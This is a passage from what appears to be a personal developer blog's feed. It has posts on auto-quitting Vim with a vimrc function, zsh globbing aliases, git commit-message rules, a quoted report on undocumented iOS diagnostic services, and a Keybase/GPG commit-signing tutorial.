<p>But as one of the Vim users, I close it within a few minutes or even a few seconds after I opened it. I want to keep quitting Vim easy. Using <code>:qa</code> everytime doesn&rsquo;t make sence. Actually, <a href="https://github.com/scrooloose/nerdtree#faq">NERDTree gives us a tip</a> to close Vim if the only window left open is a NERDTree:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'><span class="k">autocmd</span> bufenter * <span class="k">if</span> <span class="p">(</span>winnr<span class="p">(</span><span class="s2">&quot;$&quot;</span><span class="p">)</span> <span class="p">==</span> <span class="m">1</span> &amp;&amp; exists<span class="p">(</span><span class="s2">&quot;b:NERDTreeType&quot;</span><span class="p">)</span> &amp;&amp; <span class="k">b</span>:NERDTreeType <span class="p">==</span> <span class="s2">&quot;primary&quot;</span><span class="p">)</span> <span class="p">|</span> <span class="k">q</span> <span class="p">|</span> <span class="k">endif</span>
</span></code></pre></td></tr></table></div></figure>


<p>If I close the last window when a NERDTree exists, Vim automatically closes. But what if we have Tag List window also? <code>winnr("$")</code> returns the current window count, so the above code triggers only when the window count is 1. So Vim will quit automatically only when NERDTree is the last window.</p>

<!-- more -->


<h2>Not Interesting Buffer</h2>

<p>There are some types of window which isn&rsquo;t important while quitting Vim.</p>

<ol>
<li><p>Help</p>

<p> We can look up documentation of Vim itself or its plugins by <code>:help</code> or <code>:h</code> command. This is one of the most powerful features of Vim, but these windows aren&rsquo;t editable and we don&rsquo;t need them while quitting Vim.</p></li>
<li><p>QuickFix</p>

<p> Some plugins like <a href="https://github.com/scrooloose/syntastic">Syntastic</a> or <a href="https://github.com/ngmy/vim-rubocop">Vim RuboCop</a> show errors on QuickFix window and Vim supports navigating them with <code>:cnext</code> and <code>:cprev</code>. There windows aren&rsquo;t needed also.</p></li>
<li><p>NERDTree and Tag List</p>

<p> Here is where we started.</p></li>
</ol>


<h2>Investigate the Buffer</h2>

<p>Vim buffers have its type. Help and QuickFix buffers also have it so we&rsquo;re ready to go. See <code>'buftype'</code> documentation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'>                      *<span class="s1">&#39;buftype&#39;</span>* *<span class="s1">&#39;bt&#39;</span>* *E382*
</span><span class='line'><span class="s1">&#39;buftype&#39;</span> <span class="s1">&#39;bt&#39;</span>        string <span class="p">(</span>default: <span class="s2">&quot;&quot;</span><span class="p">)</span>
</span><span class='line'>          local <span class="k">to</span> buffer
</span><span class='line'>          {not <span class="k">in</span> Vi}
</span><span class='line'>          {not available when compiled without the <span class="p">|+</span>quickfix<span class="p">|</span>
</span><span class='line'>          feature}
</span><span class='line'>  The value of this <span class="k">option</span> specifies the type of <span class="k">a</span> buffer:
</span><span class='line'>    <span class="p">&lt;</span>empty<span class="p">&gt;</span>   normal buffer
</span><span class='line'>    nofile    buffer which <span class="k">is</span> not related <span class="k">to</span> <span class="k">a</span> <span class="k">file</span> and will not be
</span><span class='line'>          written
</span><span class='line'>    <span class="nb">nowrite</span>   buffer which will not be written
</span><span class='line'>    acwrite   buffer which will always be written with <span class="nb">BufWriteCmd</span>
</span><span class='line'>          autocommands. {not available when compiled without the
</span><span class='line'>          <span class="p">|+</span><span class="k">autocmd</span><span class="p">|</span> feature}
</span><span class='line'>    quickfix  quickfix buffer<span class="p">,</span> contains <span class="nb">list</span> of errors <span class="p">|</span>:<span class="k">cwindow</span><span class="p">|</span>
</span><span class='line'>          or <span class="nb">list</span> of locations <span class="p">|</span>:<span class="k">lwindow</span><span class="p">|</span>
</span><span class='line'>    help      help buffer <span class="p">(</span>you are not supposed <span class="k">to</span> <span class="k">set</span> this
</span><span class='line'>          manually<span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Because <code>quickfix</code> and <code>help</code> type is already exists, all we have to do is retrieve that value. This code returns the buftype of current buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'>getbufvar<span class="p">(</span>winbufnr<span class="p">(</span><span class="m">0</span><span class="p">),</span> <span class="s1">&#39;&amp;buftype&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that <code>winbufnr(0)</code> returns the number of the buffer in the current window.</p>

<p>For NERDTree and Tag List, we check the name of the buffer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'>bufname<span class="p">(</span>winbufnr<span class="p">(</span><span class="m">0</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>NERDTree has <code>t:NERDTreeBufName</code> for this, Tag List has same name for every buffer; <code>__Tag_List__</code>.</p>

<p>So we can check whether the current buffer is NERDTree or not with this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'>exists<span class="p">(</span><span class="s1">&#39;t:NERDTreeBufName&#39;</span><span class="p">)</span> &amp;&amp; bufname<span class="p">(</span>winbufnr<span class="p">(</span><span class="m">0</span><span class="p">))</span> <span class="p">==</span> <span class="k">t</span>:NERDTreeBufName
</span></code></pre></td></tr></table></div></figure>


<p>For Tag List:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'>bufname<span class="p">(</span>winbufnr<span class="p">(</span><span class="m">0</span><span class="p">))</span> <span class="p">==</span> <span class="s1">&#39;__Tag_List__&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Automatically Quit Vim</h2>

<p>We can check the current buffer is important or not. Then how can we check that for every buffer? Now do some basic programming.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='vim'><span class='line'><span class="k">function</span><span class="p">!</span> CheckLeftBuffers<span class="p">()</span>
</span><span class='line'>  <span class="k">if</span> tabpagenr<span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">)</span> <span class="p">==</span> <span class="m">1</span>
</span><span class='line'>    <span class="k">let</span> <span class="k">i</span> <span class="p">=</span> <span class="m">1</span>
</span><span class='line'>    <span class="k">while</span> <span class="k">i</span> <span class="p">&lt;=</span> winnr<span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> getbufvar<span class="p">(</span>winbufnr<span class="p">(</span><span class="k">i</span><span class="p">),</span> <span class="s1">&#39;&amp;buftype&#39;</span><span class="p">)</span> <span class="p">==</span> <span class="s1">&#39;help&#39;</span> <span class="p">||</span>
</span><span class='line'>          \ getbufvar<span class="p">(</span>winbufnr<span class="p">(</span><span class="k">i</span><span class="p">),</span> <span class="s1">&#39;&amp;buftype&#39;</span><span class="p">)</span> <span class="p">==</span> <span class="s1">&#39;quickfix&#39;</span> <span class="p">||</span>
</span><span class='line'>          \ exists<span class="p">(</span><span class="s1">&#39;t:NERDTreeBufName&#39;</span><span class="p">)</span> &amp;&amp;
</span><span class='line'>          \   bufname<span class="p">(</span>winbufnr<span class="p">(</span><span class="k">i</span><span class="p">))</span> <span class="p">==</span> <span class="k">t</span>:NERDTreeBufName <span class="p">||</span>
</span><span class='line'>          \ bufname<span class="p">(</span>winbufnr<span class="p">(</span><span class="k">i</span><span class="p">))</span> <span class="p">==</span> <span class="s1">&#39;__Tag_List__&#39;</span>
</span><span class='line'>        <span class="k">let</span> <span class="k">i</span> <span class="p">+=</span> <span class="m">1</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>      <span class="k">endif</span>
</span><span class='line'>    <span class="k">endwhile</span>
</span><span class='line'>    <span class="k">if</span> <span class="k">i</span> <span class="p">==</span> winnr<span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span>
</span><span class='line'>      <span class="k">qall</span>
</span><span class='line'>    <span class="k">endif</span>
</span><span class='line'>    unlet <span class="k">i</span>
</span><span class='line'>  <span class="k">endif</span>
</span><span class='line'><span class="k">endfunction</span>
</span><span class='line'><span class="k">autocmd</span> <span class="nb">BufEnter</span> * <span class="k">call</span> CheckLeftBuffers<span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that <code>CheckLeftBuffers()</code> will check buffers only when the tab page count is 1. It iterates every window and check its <code>'buftype'</code> is <code>'help'</code> or <code>'quickfix'</code>. If every window is Help window or QuickFix window, <code>i</code> becomes <code>winnr('$') + 1</code>. Then we&rsquo;re safe to quit all windows by calling <code>qall</code>. Finally we add <code>CheckLeftBuffers()</code> to <code>BufEnter *</code>, so it&rsquo;ll be called on everytime we close a window&mdash;<strong>on the fly!</strong></p>

<p>You can see my actual <a href="https://github.com/yous/dotfiles/commit/735976604471bb6186d3867a30c421c839ad3ad4">vimrc commit</a> and also check out my <a href="https://github.com/yous/dotfiles">dotfiles repo</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On becoming an expert C programmer &rarr;]]></title>
    <link href="http://yous.be/2014/10/26/on-becoming-an-expert-c-programmer/"/>
    <updated>2014-10-26T22:21:30+09:00</updated>
    <id>http://yous.be/2014/10/26/on-becoming-an-expert-c-programmer</id>
    <content type="html"><![CDATA[<blockquote><p>The following is from an EMail message that I sent to to an individual on 12-Apr-2001. You may find this EMail message useful.</p>

<p>The Writer asked:</p>

<blockquote><p>&ldquo;I just recently visited your website &hellip; Just wanted to say greetings and ask a simple question: Do you think I stand a chance in the C programming field if I keep it up? Tell me what I should do in order to keep strong feelings towards C.&rdquo;</p></blockquote></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Yet Another Hex Word]]></title>
    <link href="http://yous.be/2014/09/21/yet-another-hex-word/"/>
    <updated>2014-09-21T05:59:49+09:00</updated>
    <id>http://yous.be/2014/09/21/yet-another-hex-word</id>
    <content type="html"><![CDATA[<p><img src="http://yous.be/images/2014/09/21/01de57.svg" title="#01de57" >
<img src="http://yous.be/images/2014/09/21/0a7.svg" title="#0a7" >
<img src="http://yous.be/images/2014/09/21/0dd.svg" title="#0dd" >
<img src="http://yous.be/images/2014/09/21/0ff.svg" title="#0ff" >
<img src="http://yous.be/images/2014/09/21/0ff1ce.svg" title="#0ff1ce" >
<img src="http://yous.be/images/2014/09/21/10ca1e.svg" title="#10ca1e" >
<img src="http://yous.be/images/2014/09/21/57ab1e.svg" title="#57ab1e" >
<img src="http://yous.be/images/2014/09/21/5ad.svg" title="#5ad" >
<img src="http://yous.be/images/2014/09/21/5afe57.svg" title="#5afe57" >
<img src="http://yous.be/images/2014/09/21/50f7ba11.svg" title="#50f7ba11" >
<img src="http://yous.be/images/2014/09/21/70e.svg" title="#70e" >
<img src="http://yous.be/images/2014/09/21/7a7700.svg" title="#7a7700" >
<img src="http://yous.be/images/2014/09/21/7ab.svg" title="#7ab" >
<img src="http://yous.be/images/2014/09/21/7ab1e7.svg" title="#7ab1e7" >
<img src="http://yous.be/images/2014/09/21/7ea.svg" title="#7ea" >
<img src="http://yous.be/images/2014/09/21/ad1da5.svg" title="#ad1da5" >
<img src="http://yous.be/images/2014/09/21/affec7.svg" title="#affec7" >
<img src="http://yous.be/images/2014/09/21/b01dface.svg" title="#b01dface" >
<img src="http://yous.be/images/2014/09/21/b0771e.svg" title="#b0771e" >
<img src="http://yous.be/images/2014/09/21/ba11ad.svg" title="#ba11ad" >
<img src="http://yous.be/images/2014/09/21/ba5eba11.svg" title="#ba5eba11" >
<img src="http://yous.be/images/2014/09/21/c0ffee.svg" title="#c0ffee" >
<img src="http://yous.be/images/2014/09/21/c105e7.svg" title="#c105e7" >
<img src="http://yous.be/images/2014/09/21/c105ed.svg" title="#c105ed" >
<img src="http://yous.be/images/2014/09/21/ca7.svg" title="#ca7" >
<img src="http://yous.be/images/2014/09/21/cafebabe.svg" title="#cafebabe" >
<img src="http://yous.be/images/2014/09/21/d00d1e.svg" title="#d00d1e" >
<img src="http://yous.be/images/2014/09/21/d1ab10.svg" title="#d1ab10" >
<img src="http://yous.be/images/2014/09/21/dad.svg" title="#dad" >
<img src="http://yous.be/images/2014/09/21/de7ec7.svg" title="#de7ec7" >
<img src="http://yous.be/images/2014/09/21/deadbeef.svg" title="#deadbeef" >
<img src="http://yous.be/images/2014/09/21/dec0de.svg" title="#dec0de" >
<img src="http://yous.be/images/2014/09/21/defea7.svg" title="#defea7" >
<img src="http://yous.be/images/2014/09/21/defec7.svg" title="#defec7" >
<img src="http://yous.be/images/2014/09/21/defec7ed.svg" title="#defec7ed" >
<img src="http://yous.be/images/2014/09/21/ea7.svg" title="#ea7" >
<img src="http://yous.be/images/2014/09/21/effec7.svg" title="#effec7" >
<img src="http://yous.be/images/2014/09/21/f007ba11.svg" title="#f007ba11" >
<img src="http://yous.be/images/2014/09/21/f01ded.svg" title="#f01ded" >
<img src="http://yous.be/images/2014/09/21/faceb00c.svg" title="#faceb00c" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Write a Git Commit Message &rarr;]]></title>
    <link href="http://yous.be/2014/09/03/how-to-write-a-git-commit-message/"/>
    <updated>2014-09-03T22:12:47+09:00</updated>
    <id>http://yous.be/2014/09/03/how-to-write-a-git-commit-message</id>
    <content type="html"><![CDATA[<p><a href="http://xkcd.com/1296/"><img src="http://imgs.xkcd.com/comics/git_commit.png" alt="Git Commit" /></a></p>

<blockquote><h2>The seven rules of a great git commit message</h2>

<blockquote><p>Keep in mind: <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html">This</a> <a href="http://www.git-scm.com/book/en/Distributed-Git-Contributing-to-a-Project#Commit-Guidelines">has</a> <a href="https://github.com/torvalds/subsurface/blob/master/README#L82-109">all</a> <a href="http://who-t.blogspot.co.at/2009/12/on-commit-messages.html">been</a> <a href="https://github.com/erlang/otp/wiki/writing-good-commit-messages">said</a> <a href="https://github.com/spring-projects/spring-framework/blob/30bce7/CONTRIBUTING.md#format-commit-messages">before</a>.</p></blockquote>

<ol>
<li><a href="http://chris.beams.io/posts/git-commit/#separate">Separate subject from body with a blank line</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#limit-50">Limit the subject line to 50 characters</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#capitalize">Capitalize the subject line</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#end">Do not end the subject line with a period</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#imperative">Use the imperative mood in the subject line</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#wrap-72">Wrap the body at 72 characters</a></li>
<li><a href="http://chris.beams.io/posts/git-commit/#why-not-how">Use the body to explain <em>what</em> and <em>why</em> vs. <em>how</em></a></li>
</ol>
</blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[zsh: no matches found &rarr;]]></title>
    <link href="http://yous.be/2014/08/05/zsh-no-matches-found/"/>
    <updated>2014-08-05T14:31:03+09:00</updated>
    <id>http://yous.be/2014/08/05/zsh-no-matches-found</id>
    <content type="html"><![CDATA[<p>With the use of <a href="http://www.git-scm.com">Git</a> or <a href="http://octopress.org">Octopress</a> (typically <a href="https://github.com/ruby/rake">Rake</a>), we type <code>[</code>, <code>]</code>, <code>^</code> characters to terminal:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>git reset HEAD^
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>rake install<span class="o">[</span>classic<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Some <a href="http://www.zsh.org">Zsh</a> users know what would happen when we type that commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>zsh: no matches found: HEAD^
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>zsh: no matches found: install<span class="o">[</span>classic<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is caused by Zsh:</p>

<blockquote><p>zsh allows Filename Generation and Pattern Matching (Globbing) using square brackets and other characters (explained in the <a href="http://zsh.sourceforge.net/Guide/zshguide05.html">zsh guide</a>, section 5.9).</p></blockquote>

<p>The solution is simple:</p>

<blockquote><p>The solution, found in the <a href="http://zsh.sourceforge.net/FAQ/zshfaq03.html">zsh FAQ</a> (section 3.4), is simply adding a line in ~/.zshrc that disables globbing for a single command:</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nb">alias </span><span class="nv">rake</span><span class="o">=</span><span class="s2">&quot;noglob rake&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Aliasing <code>git</code> is also useful:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nb">alias </span><span class="nv">git</span><span class="o">=</span><span class="s2">&quot;noglob git&quot;</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Undocumented iOS functions allow monitoring of personal data, expert says &rarr;]]></title>
    <link href="http://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says/"/>
    <updated>2014-07-22T22:19:14+09:00</updated>
    <id>http://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says</id>
    <content type="html"><![CDATA[<blockquote><p>&ldquo;Backdoor&rdquo; can be abused by gov&rsquo;t agents and ex-lovers to gain persistent access.</p>

<p>Apple has endowed iPhones with undocumented functions that allow unauthorized people in privileged positions to wirelessly connect and harvest pictures, text messages, and other sensitive data without entering a password or PIN, a forensic scientist warned over the weekend.</p>

<p>Zdziarski said the service that raises the most concern is known as com.apple.mobile.file_relay. It dishes out a staggering amount of data&mdash;including account data for e-mail, Twitter, iCloud, and other services, a full copy of the address book including deleted entries, the user cache folder, logs of geographic positions, and a complete dump of the user photo album&mdash;all without requiring a backup password to be entered. He said two other services dubbed com.apple.pcapd and com.apple.mobile.house_arrest may have legitimate uses for app developers or support people but can also be used to spy on users by government agencies or even jilted ex-lovers. The Pcapd service, for instance, allows people to wirelessly monitor all network traffic traveling into and out of the device, even when it&rsquo;s not running in a special developer or support mode. House_arrest, meanwhile, allows the copying of sensitive files and documents from Twitter, Facebook, and many other applications.</p>

<p><img src="http://cdn.arstechnica.net/wp-content/uploads/2014/07/pcapd1.jpg" alt="com.apple.pcapd" /></p>

<p>Slides of Zdziarski&rsquo;s talk, titled <strong>Identifying Back Doors, Attack Points, and Surveillance Mechanisms in iOS Devices</strong> are <a href="http://www.zdziarski.com/blog/wp-content/uploads/2014/07/iOS_Backdoors_Attack_Points_Surveillance_Mechanisms.pdf">here</a>.</p></blockquote>

<p>Also check the page about <a href="http://support.apple.com/kb/HT6331">iOS: About diagnostic capabilities</a> on Apple Support:</p>

<blockquote><p>Each of these diagnostic capabilities requires the user to have unlocked their device and agreed to trust another computer. Any data transmitted between the iOS device and trusted computer is encrypted with keys not shared with Apple. For users who have enabled iTunes Wi-Fi Sync on a trusted computer, these services may also be accessed wirelessly by that computer.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Using Keybase]]></title>
    <link href="http://yous.be/2014/07/18/using-keybase/"/>
    <updated>2014-07-18T03:21:09+09:00</updated>
    <id>http://yous.be/2014/07/18/using-keybase</id>
    <content type="html"><![CDATA[<h2><a id="keybase"></a>Keybase</h2>

<p><img src="https://keybase.io/images/logo.png" alt="Keybase" /></p>

<blockquote><p>Keybase will be a public directory of publicly auditable public keys. All paired, for convenience, with unique usernames.</p></blockquote>

<p>I just created my <a href="https://keybase.io">Keybase</a>. You can see my PGP public key on <a href="https://keybase.io/yous">keybase.io/yous</a> and get the key via <code>https://keybase.io/yous/key.asc</code>. Anyone can encrypt messages using my public key and then I could decrypt it using my private key and see the message with safety. All of these can be done in browser, in <a href="https://keybase.io">Keybase</a>.</p>

<h2><a id="keybase-proof"></a>Keybase Proof</h2>

<p>Keybase provides several ways to prove own identity of a Twitter account, a GitHub account, websites and a bitcoin address. Still it can be done on the browser, also you can use <a href="https://keybase.io/docs/command_line">command line</a> for it. I proved <a href="https://github.com/yous">my GitHub</a> by <a href="https://gist.github.com/yous/149b0775d2ff02eac323">keybase.md</a> and <a href="http://yous.be">this site</a> by <a href="http://yous.be/keybase.txt">keybase.txt</a>. Also you can check it with command line like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>keybase id yous
</span><span class='line'>✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
</span><span class='line'>✔ <span class="s2">&quot;yous&quot;</span> on github: https://gist.github.com/149b0775d2ff02eac323
</span><span class='line'>✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
</span></code></pre></td></tr></table></div></figure>




<!-- more -->


<h2><a id="directory-signing"></a>Directory Signing</h2>

<p>Command line program of Keybase provides <code>dir</code> command to sign or verify directory. First you should install command line, see the <a href="https://keybase.io/docs/command_line/installation">installation docs</a>. If you already have an account, just run <code>keybase login</code>. You can also signup with <code>keybase signup</code> in terminal.</p>

<p>At first, you should change directory to sign:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>~ <span class="nv">$ </span><span class="nb">cd </span>Dropbox/Public
</span><span class='line'>~/Dropbox/Public <span class="nv">$ </span>keybase dir sign
</span><span class='line'>info: Success! Wrote SIGNED.md from <span class="m">224</span> found items
</span></code></pre></td></tr></table></div></figure>


<p>then <code>~/Dropbox/Public/SIGNED.md</code> is generated. On same directory, veryfing directory is also possible with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>~/Dropbox/Public <span class="nv">$ </span>keybase dir verify
</span><span class='line'>info: Valid signature from keybase user yous
</span><span class='line'>✔ public key fingerprint: 1BF1 AFE8 682E 45A2 11FF 2C0E 891B 7A9E 1D5A 400A
</span><span class='line'>✔ <span class="s2">&quot;yous&quot;</span> on github: https://gist.github.com/149b0775d2ff02eac323
</span><span class='line'>✔ admin of yous.be via HTTP: http://yous.be/keybase.txt
</span><span class='line'>info: Signed <span class="m">4</span> minutes ago <span class="o">(</span>Fri Jul <span class="m">18</span> <span class="m">2014</span> 20:06:31 GMT+0900 <span class="o">(</span>KST<span class="o">))</span>
</span><span class='line'>info: Success! <span class="m">1</span> signature<span class="o">(</span>s<span class="o">)</span> verified<span class="p">;</span> <span class="m">224</span> items checked
</span></code></pre></td></tr></table></div></figure>


<h2><a id="using-custom-email"></a>Using Custom Email</h2>

<p>When you create public key on <a href="https://keybase.io">Keybase</a>, default UID has name as <code>keybase.io/&lt;username&gt;</code> and email as <code>&lt;username&gt;@keybase.io</code>. You can add UID with your real name and regular email. From <a href="http://superuser.com/questions/293184/one-gnupg-pgp-key-pair-two-emails">One GnuPG/PGP key pair, two emails?</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gpg --edit-key &lt;username&gt;@keybase.io
</span><span class='line'>gpg&gt; adduid
</span><span class='line'>Real name: &lt;name&gt;
</span><span class='line'>Email address: &lt;email&gt;
</span><span class='line'>Comment: &lt;comment or Return to none&gt;
</span><span class='line'>Change <span class="o">(</span>N<span class="o">)</span>ame, <span class="o">(</span>C<span class="o">)</span>omment, <span class="o">(</span>E<span class="o">)</span>mail or <span class="o">(</span>O<span class="o">)</span>kay/<span class="o">(</span>Q<span class="o">)</span>uit? o
</span><span class='line'>Enter passphrase: &lt;passphrase&gt;
</span><span class='line'>gpg&gt; uid &lt;uid&gt;
</span><span class='line'>gpg&gt; trust
</span><span class='line'>Your decision? 5
</span><span class='line'>Do you really want to <span class="nb">set </span>this key to ultimate trust? <span class="o">(</span>y/N<span class="o">)</span> y
</span><span class='line'>gpg&gt; save
</span></code></pre></td></tr></table></div></figure>


<h2><a id="signing-commits"></a>Signing Commits</h2>

<p>All the crypto of Keybase is performed with GPG, you can sign your tags and your commits. To setup your signing key, you need to get your key id by:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gpg --list-secret-keys <span class="p">|</span> grep <span class="s2">&quot;^sec&quot;</span>
</span><span class='line'>sec   4096R/1D5A400A 2014-07-16
</span></code></pre></td></tr></table></div></figure>


<p>The <code>1D5A400A</code> part is your key id. Then simply you can set your signing key by:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git config --global user.signingkey 1D5A400A
</span></code></pre></td></tr></table></div></figure>


<p>Also</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git config --global commit.gpgsign <span class="nb">true</span>
</span></code></pre></td></tr></table></div></figure>


<p>makes Git to sign every commits:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>mkdir tmp <span class="o">&amp;&amp;</span> <span class="nb">cd </span>tmp
</span><span class='line'><span class="nv">$ </span>git init
</span><span class='line'><span class="nv">$ </span><span class="nb">echo </span>foo &gt; foo
</span><span class='line'><span class="nv">$ </span>git add foo
</span><span class='line'><span class="nv">$ </span>git commit -m <span class="s2">&quot;Test commit of foo&quot;</span>
</span><span class='line'>
</span><span class='line'>You need a passphrase to unlock the secret key <span class="k">for</span>
</span><span class='line'>user: <span class="s2">&quot;John Doe &lt;john.doe@example.com&gt;&quot;</span>
</span><span class='line'>2048-bit RSA key, ID E79FBC2D, created 2014-07-16 <span class="o">(</span>main key ID 1D5A400A<span class="o">)</span>
</span><span class='line'>
